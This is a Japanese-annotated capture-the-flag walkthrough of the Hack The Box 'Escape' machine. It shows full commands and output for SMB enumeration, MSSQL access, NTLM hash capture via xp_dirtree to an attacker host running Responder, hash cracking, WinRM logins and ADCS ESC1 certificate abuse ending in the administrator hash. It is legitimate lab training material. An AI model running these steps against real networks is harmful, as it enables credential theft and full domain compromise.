https://app.hackthebox.com/machines/531

## STEP 1
```sh
└─$ rustscan -a 10.129.80.180 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.80.180:53
Open 10.129.80.180:88
Open 10.129.80.180:445
Open 10.129.80.180:593
Open 10.129.80.180:636
Open 10.129.80.180:1433
Open 10.129.80.180:3268
Open 10.129.80.180:3269
Open 10.129.80.180:5985
Open 10.129.80.180:9389
Open 10.129.80.180:49667
Open 10.129.80.180:49690
Open 10.129.80.180:49689
Open 10.129.80.180:49711
Open 10.129.80.180:49721
Open 10.129.80.180:49742
10.129.80.180 -> [53,88,445,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
```


## STEP 2
guestでsmb列挙
```sh
└─$ netexec smb 10.129.80.180 -u ' ' -p '' --shares
SMB         10.129.80.180  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.80.180  445    DC               [+] sequel.htb\ : (Guest)
SMB         10.129.80.180  445    DC               [*] Enumerated shares
SMB         10.129.80.180  445    DC               Share           Permissions     Remark
SMB         10.129.80.180  445    DC               -----           -----------     ------
SMB         10.129.80.180  445    DC               ADMIN$                          Remote Admin
SMB         10.129.80.180  445    DC               C$                              Default share
SMB         10.129.80.180  445    DC               IPC$            READ            Remote IPC
SMB         10.129.80.180  445    DC               NETLOGON                        Logon server share 
SMB         10.129.80.180  445    DC               Public          READ            
SMB         10.129.80.180  445    DC               SYSVOL                          Logon server share
```
pdfファイルを発見・ダウンロード
```sh
└─$ smbclient -N -c ls //10.129.80.180/Public          
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1447083 blocks available

└─$ smbget -N 'smb://10.129.80.180/Public/SQL Server Procedures.pdf'
Using domain: WORKGROUP, user: kali
smb://10.129.80.180/Public/SQL Server Procedures.pdf 
Downloaded 48.39kB in 15 seconds
```
pdfはmssqlに関するもの、step1で1433番がオープンであったことを確認したのでmssqlが動作していると推測  
ユーザ名`PublicUser`パスワード`GuestUserCantWrite1@`を確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Escape_01.png">  
pdfのクレデンシャルでmssqlにログイン成功
```sh
└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.80.180'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```


## STEP 3
あまり使わないmetasploitでmssqlの情報を列挙  
xp_cmdshellは無効だが、xp_dirtreeは使用可能みたい  
```sh
msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

msf auxiliary(admin/mssql/mssql_enum) > set database master
database => master

msf auxiliary(admin/mssql/mssql_enum) > set username PublicUser
username => PublicUser

msf auxiliary(admin/mssql/mssql_enum) > set password GuestUserCantWrite1
password => GuestUserCantWrite1

msf auxiliary(admin/mssql/mssql_enum) > set rhosts 10.129.80.180
rhosts => 10.129.80.180

msf auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.129.80.180
[*] 10.129.80.180:1433 - Running MS SQL Server Enumeration...
[*] 10.129.80.180:1433 - Version:
[*]     Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]             Sep 24 2019 13:48:23 
[*]             Copyright (C) 2019 Microsoft Corporation
[*]             Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] 10.129.80.180:1433 - Configuration Parameters:
[*] 10.129.80.180:1433 -       C2 Audit Mode is Not Enabled
[*] 10.129.80.180:1433 -       xp_cmdshell is Not Enabled
[*] 10.129.80.180:1433 -       remote access is Enabled
[*] 10.129.80.180:1433 -       allow updates is Not Enabled
[*] 10.129.80.180:1433 -       Database Mail XPs is Not Enabled
[*] 10.129.80.180:1433 -       Ole Automation Procedures are Not Enabled
[*] 10.129.80.180:1433 - Databases on the server:
[*] 10.129.80.180:1433 -       Database name:master
[*] 10.129.80.180:1433 -       Database Files for master:
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
[*] 10.129.80.180:1433 -       Database name:tempdb
[*] 10.129.80.180:1433 -       Database Files for tempdb:
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
[*] 10.129.80.180:1433 -       Database name:model
[*] 10.129.80.180:1433 -       Database Files for model:
[*] 10.129.80.180:1433 -       Database name:msdb
[*] 10.129.80.180:1433 -       Database Files for msdb:
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
[*] 10.129.80.180:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
[*] 10.129.80.180:1433 - System Logins on this Server:
[*] 10.129.80.180:1433 -       sa
[*] 10.129.80.180:1433 -       PublicUser
[*] 10.129.80.180:1433 - Disabled Accounts:
[*] 10.129.80.180:1433 -       No Disabled Logins Found
[*] 10.129.80.180:1433 - No Accounts Policy is set for:
[*] 10.129.80.180:1433 -       All System Accounts have the Windows Account Policy Applied to them.
[*] 10.129.80.180:1433 - Password Expiration is not checked for:
[*] 10.129.80.180:1433 -       sa
[*] 10.129.80.180:1433 -       PublicUser
[*] 10.129.80.180:1433 - System Admin Logins on this Server:
[*] 10.129.80.180:1433 -       sa
[*] 10.129.80.180:1433 - Windows Logins on this Server:
[*] 10.129.80.180:1433 -       No Windows logins found!
[*] 10.129.80.180:1433 - Windows Groups that can logins on this Server:
[*] 10.129.80.180:1433 -       No Windows Groups where found with permission to login to system.
[*] 10.129.80.180:1433 - Accounts with Username and Password being the same:
[*] 10.129.80.180:1433 -       No Account with its password being the same as its username was found.
[*] 10.129.80.180:1433 - Accounts with empty password:
[*] 10.129.80.180:1433 -       No Accounts with empty passwords where found.
[*] 10.129.80.180:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.129.80.180:1433 -       sp_replsetsyncstatus
[*] 10.129.80.180:1433 -       sp_replcounters
[*] 10.129.80.180:1433 -       sp_replsendtoqueue
[*] 10.129.80.180:1433 -       sp_resyncexecutesql
[*] 10.129.80.180:1433 -       sp_prepexecrpc
[*] 10.129.80.180:1433 -       sp_repltrans
[*] 10.129.80.180:1433 -       sp_xml_preparedocument
[*] 10.129.80.180:1433 -       xp_qv
[*] 10.129.80.180:1433 -       xp_getnetname
[*] 10.129.80.180:1433 -       sp_releaseschemalock
[*] 10.129.80.180:1433 -       sp_refreshview
[*] 10.129.80.180:1433 -       sp_replcmds
[*] 10.129.80.180:1433 -       sp_unprepare
[*] 10.129.80.180:1433 -       sp_resyncprepare
[*] 10.129.80.180:1433 -       sp_createorphan
[*] 10.129.80.180:1433 -       xp_dirtree
[*] 10.129.80.180:1433 -       sp_replwritetovarbin
[*] 10.129.80.180:1433 -       sp_replsetoriginator
[*] 10.129.80.180:1433 -       sp_xml_removedocument
[*] 10.129.80.180:1433 -       sp_repldone
[*] 10.129.80.180:1433 -       sp_reset_connection
[*] 10.129.80.180:1433 -       xp_fileexist
[*] 10.129.80.180:1433 -       xp_fixeddrives
[*] 10.129.80.180:1433 -       sp_getschemalock
[*] 10.129.80.180:1433 -       sp_prepexec
[*] 10.129.80.180:1433 -       xp_revokelogin
[*] 10.129.80.180:1433 -       sp_execute_external_script
[*] 10.129.80.180:1433 -       sp_resyncuniquetable
[*] 10.129.80.180:1433 -       sp_replflush
[*] 10.129.80.180:1433 -       sp_resyncexecute
[*] 10.129.80.180:1433 -       xp_grantlogin
[*] 10.129.80.180:1433 -       sp_droporphans
[*] 10.129.80.180:1433 -       xp_regread
[*] 10.129.80.180:1433 -       sp_getbindtoken
[*] 10.129.80.180:1433 -       sp_replincrementlsn
[*] 10.129.80.180:1433 - Instances found on this server:
[*] 10.129.80.180:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.129.80.180:1433 -       xp_regread might be disabled in this system
[*] Auxiliary module execution completed
```
ということで、ストアドプロシージャのxp_dirtreeでkaliに認証リクエストを飛ばしクレデンシャルをキャプチャ
```sh
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.28\share
subdirectory   depth   file   
------------   -----   ---- 
```
ユーザ名sql_svcのntハッシュを取得！
```sh
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.28]
    Responder IPv6             [dead:beef:4::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-1LRZOH31C2F]
    Responder Domain Name      [548O.LOCAL]
    Responder DCE-RPC Port     [49472]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.80.180
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C00030014003500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC01060004000200000008003000300000000000000000000000003000004136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
```
sql_svcのntハッシュをクラック成功  
パスワードは、REGGIE1234ronnieと判明
```sh
└─$ name-that-hash -f sql_svc.txt --no-banner

sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002
D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C0003001400
3500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC010600040002000000080030003000000000000000000000000030000
04136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E
00320038000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

└─$ hashcat -a 0 -m 5600 sql_svc.txt /usr/share/wordlists/rockyou.txt --quiet
SQL_SVC::sequel:b964916c38c95c45:e50990e2249a62e23a3f59ad32b1fa11:010100000000000080fcbbd78644dc017b47d91af8df22a000000000020008003500340038004f0001001e00570049004e002d0031004c0052005a004f0048003300310043003200460004003400570049004e002d0031004c0052005a004f004800330031004300320046002e003500340038004f002e004c004f00430041004c00030014003500340038004f002e004c004f00430041004c00050014003500340038004f002e004c004f00430041004c000700080080fcbbd78644dc01060004000200000008003000300000000000000000000000003000004136924fe60d10cb1e5aa1d1fd8055aa7669d12d66160b96227646026a91227d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:REGGIE1234ronnie
```
STEP1で5985番オープンを確認、またsql_svcはwinrmログイン可能を確認
```sh
└─$ netexec ldap 10.129.80.180 -u 'sql_svc' -p 'REGGIE1234ronnie' --groups 'Remote Management Users'
LDAP        10.129.80.180   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.80.180   636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
LDAPS       10.129.80.180   636    DC               sql_svc
LDAPS       10.129.80.180   636    DC               Ryan.Cooper
```
winrmログイン成功
```powershell
└─$ evil-winrm -i 10.129.80.180 -u sql_svc -p REGGIE1234ronnie
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\users\sql_svc\documents>
```


## STEP 4
ログファイル内に、ユーザ名Ryan.Cooperのログイン失敗を確認  
その後にユーザ名`NuclearMosquito3`で認証失敗を確認したが、こいつがパスワードかも
```powershell
*Evil-WinRM* PS C:\users\sql_svc\documents> cat C:\SQLServer\Logs\ERRORLOG.BAK

~~~

2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
```
step3でRyan.Cooperもwinrmログイン可能と確認  
ということでログイン成功、ユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cat ../desktop/user.txt
4ac86daa61bf3a9b8a9202dfad7e1b9c
```


## STEP 5
adcsの存在を確認
```sh
└─$ netexec ldap 10.129.80.180 -u Ryan.Cooper -p NuclearMosquito3 -M adcs   
LDAP        10.129.80.180   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.80.180   636    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
ADCS        10.129.80.180   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.80.180   389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.129.80.180   389    DC               Found CN: sequel-DC-CA
```
ESC1に該当する脆弱なテンプレートを発見
```sh
└─$ certipy-ad find -stdout -target 10.129.80.180 -enabled -vulnerable -u ryan.cooper -p NuclearMosquito3
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
administratorのpfx取得  
pfxから取り出せるpemを使用したpassthecertiricateでwinrmログインも考えたが、5986番は開いていなかったので断念
```sh
└─$ certipy-ad req -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -out administrator -target 10.129.80.180 -u ryan.cooper -p NuclearMosquito3
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
```sh
└─$ openssl pkcs12 -in administrator.pfx -passin pass:'' -info -nodes
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
PKCS7 Data
Certificate bag
Bag Attributes
    friendlyName: 
    localKeyID: F9 DA D2 42 43 ED 85 80 79 A5 DA 3A 5F 26 F2 02 6E 96 C5 28 
subject=CN=Ryan.cooper
issuer=DC=htb, DC=sequel, CN=sequel-DC-CA
-----BEGIN CERTIFICATE-----
MIIF4DCCBMigAwIBAgITHgAAABEQNHvqrtc1XwAAAAAAETANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUxMDI1MTExMzEzWhcNMzUxMDIz
MTExMzEzWjAWMRQwEgYDVQQDEwtSeWFuLmNvb3BlcjCCASIwDQYJKoZIhvcNAQEB
BQADggEPADCCAQoCggEBALqsFdps6r+snahDis3f3/E8WxFXaq4djqqvv7xHENug
AqIELTToIPXd17ZiK+aVV6tg6DTw2JPkWZhVk1wgOAsSUo9wNAp0GR22l21apHcj
Fl5/EopbuFMbFs8jpcOGNVD9eoVgC+KSZ59en2V99Pnow2Peb3dMPPAMK/sKx6Pb
hUDdTGno8NVY5Lhyc/naqxYUVwZUNfxFsFeu8DEkrf0mWEFAvnXlS03d30fERbWf
KFrIzZKzDeK0j5m46mJ3wiPH7w3Bm9kRxO0bRZhqJjnfSmijq0reOHMbaTUw9fB2
OcYCgOQEY5AyREWIuroS8JxSZZWVCaGrkZCXrJT+mQ0CAwEAAaOCAvcwggLzMDMG
A1UdEQQsMCqgKAYKKwYBBAGCNxQCA6AaDBhhZG1pbmlzdHJhdG9yQHNlcXVlbC5o
dGIwHQYDVR0OBBYEFG52n2oS/g3q0TtzVLJfzuhRVVqLMB8GA1UdIwQYMBaAFGKf
MqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
Oi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVibGljJTIwS2V5
JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1
ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoG
CCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049QUlBLENOPVB1
YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRp
b24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh
c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAOBgNVHQ8BAf8EBAMCBaAwPQYJKwYB
BAGCNxUHBDAwLgYmKwYBBAGCNxUIh6vzdoXcplaH/ZU1g7/DWYOJyjWBd9/KCIae
7CkCAWUCAQQwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsGAQUFBwMEBgorBgEEAYI3
CgMEMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYK
KwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggq
hkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwDQYJKoZIhvcNAQELBQAD
ggEBAGMvcDJS+XwF2LN2n25U+5I2XyAJdaJV+v8OwRXGOGBlnPK0JkA/6RA5KxUN
7QyT3DeCSkkM4mYjzZXGInK/lvHpXEp/X5+GNZVkg5zZYjAg3KdYK5QjJeRw2pb/
KePpT8NGrQKLBXG47KMcA1rdLmDYND/hQKxqYcztuPGKe5/FBygC8ckZrWBDB4iq
fMlsMvotJdsy8BXImhAz2bzFBXY+bLR/Va6r8uTGXKim0N7KufCOfaDlSxJkVLhI
w3wYmT4mXdWbtB5F9DxfTu37JQEHku9K5gjw0ltGEZqjA4oS4XG2CPs2inhn2Edl
QVgO2tHaWLrKgr9yoH+gN3T71LI=
-----END CERTIFICATE-----
PKCS7 Data
Key bag
Bag Attributes
    friendlyName: 
    localKeyID: F9 DA D2 42 43 ED 85 80 79 A5 DA 3A 5F 26 F2 02 6E 96 C5 28 
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC6rBXabOq/rJ2o
Q4rN39/xPFsRV2quHY6qr7+8RxDboAKiBC006CD13de2YivmlVerYOg08NiT5FmY
VZNcIDgLElKPcDQKdBkdtpdtWqR3IxZefxKKW7hTGxbPI6XDhjVQ/XqFYAvikmef
Xp9lffT56MNj3m93TDzwDCv7Csej24VA3Uxp6PDVWOS4cnP52qsWFFcGVDX8RbBX
rvAxJK39JlhBQL515UtN3d9HxEW1nyhayM2Ssw3itI+ZuOpid8Ijx+8NwZvZEcTt
G0WYaiY530poo6tK3jhzG2k1MPXwdjnGAoDkBGOQMkRFiLq6EvCcUmWVlQmhq5GQ
l6yU/pkNAgMBAAECggEAFmcpLz/jk3HasPM8MRWFaYz6C/R/DdrnwJXbj7PCsuz6
6+lO6JrUO9WuOgoBpUh2j0+PxqzB/UvKMeVRTFzkhPWjuWm4oSmKSx3bAgl/E/o+
yMP83GSCFF07qUvorLTKaMgnAGNEweIatA512Ecb07NK4c0z+PAKHzACxjvmtkQh
a8veN7+VjA4FSIoXImX4jigJ4C2UPs1knOS6lRXwxwkh+DjpC+wpIWSv6PbGpl8r
ETcL5/aERnY7k0MRkM5gHTObwYMsa2KDYcBPJWWyD2H+UMcbm1ow5yITPZjsdaYI
gADRhsFbUzhmtjSjwGMfJISCYBMhc/UGYgmPnt5i6QKBgQDlP17K/fwC72x9kTti
oH0GmHlmF9WiT5Aig2xvd/yEEQky29muB8Jqg9PcWqLhXan0A5fgAXe/oaIEM/VZ
3NNhV/+i0crYKN59ARFbCTF1Ywz20+z9GQ3L5y6GXqaFhk5rBI6V5qUH1eJwZXyO
PG2AQMiuKUzxSnqu965ujP4i5QKBgQDQdM2a/hkSRCom91MR4vGZpd9bQnhpVVAM
Bo1MqQdLZAyDha2WY06lReQdi7tfu7MeBCxTnSWWl+UEN3vZoSOesS7qZgCUdXoz
+DB06lAWEdqtQj0mKy5PKUfOOKTZpAjdnvMO+kBtPo5a4bycbF4E2rcZsQX23KOy
NEYW0jDzCQKBgDhtD6UBPP1v9xE1JRvSitOLxh3F8hSAZubH2HHbY7ESDGSTTpIS
YN0c05HiUUMNbd6c384ILnRhkWJdc5+JxhGoukhWQQpRjOnR0HbK3XyaQ7+hTCzD
9OxiW8ZBF9W3yCd5OKtW2PoDwDeQE0djQkSWLY8IpWKixW25kxqs44StAoGAbce1
qBR9e6MuV8sUkmzkM7ipQlRlOYPWXh7tNxwlXUzZUkKKQpMWDfAazHyUNzyQfhRQ
i9BMxVxFHc1iiiBUs/Q38vW5BHZB3zCrxEbJ2nWYpnol3f4Lq2DgEfi+yGecy6oz
8wVT/LRfH/mV7QMdGI1etEcIDxPvmZ/x8X7MjJECgYBD8recL9DADQZBJo/xEIMZ
Bhsla3stFGQeNMMMn7MTBWf6bFzgXcmzAjItS83UjOQJt+glR88b5nXjidXmtn0I
cDri0QM0uAAPs1iPV7OQmaiSe5ODdsD7CEDsQzJepLja6VmjGdFU1N1ILRgWM2ji
nt93DXuBYgFnL+WoZzeFIg==
-----END PRIVATE KEY-----
```
```sh
└─$ certipy-ad auth -pfx administrator.pfx -no-save -dc-ip 10.129.80.180            
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
